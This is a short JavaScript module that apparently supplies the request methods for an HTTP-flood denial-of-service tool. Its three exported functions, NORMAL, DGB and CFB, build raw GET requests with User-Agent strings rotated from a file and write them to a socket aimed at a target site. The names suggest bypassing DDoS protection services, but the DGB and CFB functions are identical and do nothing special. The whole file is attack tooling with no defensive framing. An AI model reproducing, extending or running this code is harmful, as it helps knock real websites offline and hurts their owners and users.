const fs = require('fs');

const userAgents = fs.readFileSync('uas.txt', 'utf8').split('\n').filter(Boolean);

module.exports = {
    NORMAL: (socket, target, kbSize) => {
        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: ${userAgent}\r\n\r\n`;
        socket.write(payload);
    },

    DGB: (socket, target, kbSize) => {
        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\n\r\n`;
        socket.write(payload);
    },

    CFB: (socket, target, kbSize) => {
        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\n\r\n`;
        socket.write(payload);
    },
};
